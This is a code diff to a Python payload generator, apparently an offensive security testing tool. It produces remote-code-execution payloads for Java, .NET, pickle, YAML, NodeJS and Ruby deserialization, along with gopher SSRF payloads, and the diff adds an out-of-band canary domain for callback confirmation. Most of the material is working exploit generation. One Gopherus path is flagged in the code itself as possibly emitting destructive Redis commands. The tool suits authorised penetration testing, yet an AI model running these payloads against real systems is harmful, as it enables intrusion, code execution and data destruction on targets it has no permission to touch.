@@ -6,7 +6,7 @@ import pickle
 import sys
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from tool_config import get_tool_path
+from tool_config import get_tool_path, get_oob_domain
 
 class PayloadMutation:
 
@@ -168,12 +168,19 @@ class PayloadMutation:
                 "hint":  "java -jar ysoserial-all.jar URLDNS 'http://YOUR_CANARY' | base64"
             }]
 
-        canary = "http://canary.REPLACE_WITH_YOUR_INTERACTSH_DOMAIN.com"
-        b64    = self._run_ysoserial("URLDNS", canary)
+        oob_domain = get_oob_domain()
+        if oob_domain:
+            canary = f"http://{oob_domain}"
+            note = f"Configured OOB domain — check {oob_domain}'s interaction log for a DNS/HTTP callback"
+        else:
+            canary = "http://canary.REPLACE_WITH_YOUR_INTERACTSH_DOMAIN.com"
+            note = "No OOB domain configured — set 'oob_domain' in config.json (or ETHICALQUOC_OOB_DOMAIN) to your Interactsh/Burp Collaborator subdomain"
+
+        b64 = self._run_ysoserial("URLDNS", canary)
 
         if b64:
             payload = self._make_payload("java_urldns", "URLDNS", canary, b64)
-            payload["note"] = "Replace canary domain with your interactsh or burp collaborator URL"
+            payload["note"] = note
             return [payload]
 
         return []
@@ -474,7 +481,7 @@ class PayloadMutation:
 
     ## Python Pickle
 
-    PICKLE_TEST_COMMANDS = ["id", "whoami", "hostname"]
+    PICKLE_TEST_COMMANDS = TEST_COMMANDS
 
     class _PickleRCE:
         def __init__(self, command):
@@ -498,7 +505,7 @@ class PayloadMutation:
 
     ## YAML
 
-    YAML_TEST_COMMANDS = ["id", "whoami", "hostname"]
+    YAML_TEST_COMMANDS = TEST_COMMANDS
 
     def _mutate_yaml(self) -> list[dict]:
         results = []
@@ -516,7 +523,7 @@ class PayloadMutation:
 
     ## NodeJS
 
-    NODEJS_TEST_COMMANDS = ["id", "whoami", "hostname"]
+    NODEJS_TEST_COMMANDS = TEST_COMMANDS
 
     def _mutate_nodejs(self) -> list[dict]:
         results = []
@@ -546,7 +553,7 @@ class PayloadMutation:
 
     ## Ruby Marshal
 
-    RUBY_TEST_COMMANDS = ["id", "whoami", "hostname"]
+    RUBY_TEST_COMMANDS = TEST_COMMANDS
 
     def _mutate_ruby(self) -> list[dict]:
         results = []
@@ -584,7 +591,7 @@ class PayloadMutation:
 
     YSOSERIALNET_PATH = get_tool_path("ysoserial_net")
 
-    DOTNET_TEST_COMMANDS = ["id", "whoami", "hostname"]
+    DOTNET_TEST_COMMANDS = TEST_COMMANDS
 
     DOTNET_GADGETS = [
         "TypeConfuseDelegate",
@@ -621,7 +628,8 @@ class PayloadMutation:
         except subprocess.TimeoutExpired:
             print(f"[!] Timeout: {gadget}")
             return None
-        except FileNotFoundError:
+        except (FileNotFoundError, PermissionError, OSError) as e:
+            print(f"[!] Could not run ysoserial.net: {e}")
             return None
 
     def _mutate_dotnet_viewstate(self) -> list[dict]:
@@ -668,7 +676,7 @@ class PayloadMutation:
 
     GOPHERUS_PATH = get_tool_path("gopherus")
 
-    WRAPPER_TEST_COMMANDS = ["id", "whoami", "hostname"]
+    WRAPPER_TEST_COMMANDS = TEST_COMMANDS
 
     def _mutate_wrapper(self) -> list[dict]:
         if self.probe == "rce":
@@ -736,11 +744,41 @@ class PayloadMutation:
 
         return results
 
+    _PYTHON2_CANDIDATES = ["python2", "py -2", r"C:\Python27\python.exe"]
+
+    def _find_python2(self) -> list[str] | None:
+        """Gopherus (Analyze/third_tool/gopherus) is Python 2-only source.
+        Tries common ways a Python 2 interpreter might be installed/aliased
+        and returns the first one that responds to --version, or None if
+        none is available.
+        """
+        for candidate in self._PYTHON2_CANDIDATES:
+            cmd = candidate.split()
+            try:
+                result = subprocess.run(cmd + ["--version"], capture_output=True, timeout=5)
+                if result.returncode == 0:
+                    return cmd
+            except (FileNotFoundError, OSError):
+                continue
+        return None
+
     def _mutate_wrapper_ssrf(self) -> list[dict]:
-        if os.path.exists(self.GOPHERUS_PATH):
+        oob_domain = get_oob_domain()
+        if oob_domain:
+            raw = f"gopher://{oob_domain}:80/_GET%20/oob-ssrf-check%20HTTP/1.1"
+            b64 = base64.b64encode(raw.encode()).decode()
+            canary_payload = self._make_payload("wrapper_ssrf_oob_canary", "gopher/oob-canary", None, b64)
+            canary_payload["payload_raw"] = raw
+            canary_payload["note"] = f"Blind SSRF confirmation — check {oob_domain}'s interaction log for an inbound connection"
+            canary_result = [canary_payload]
+        else:
+            canary_result = []
+
+        python2 = self._find_python2()
+        if os.path.exists(self.GOPHERUS_PATH) and python2:
             try:
                 proc = subprocess.run(
-                    ["python", self.GOPHERUS_PATH, "--exploit", "redis"],
+                    python2 + [self.GOPHERUS_PATH, "--exploit", "redis"],
                     capture_output=True, text=True, timeout=15,
                 )
                 if proc.returncode == 0 and proc.stdout.strip():
@@ -749,7 +787,7 @@ class PayloadMutation:
                     payload = self._make_payload("wrapper_ssrf_gopher", "gopherus/redis", None, b64)
                     payload["payload_raw"] = raw
                     payload["note"] = "Generated via Gopherus — review before use, may contain destructive Redis commands"
-                    return [payload]
+                    return canary_result + [payload]
             except (subprocess.TimeoutExpired, FileNotFoundError):
                 pass
 
@@ -762,7 +800,7 @@ class PayloadMutation:
             "Benign Redis INFO probe (non-destructive) to confirm SSRF reaches an internal Redis instance. "
             "Gopherus not found — install for richer Redis/Memcached RCE payloads."
         )
-        return [payload]
+        return canary_result + [payload]
 
     def _mutate_wrapper_php_input(self) -> list[dict]:
         results = []
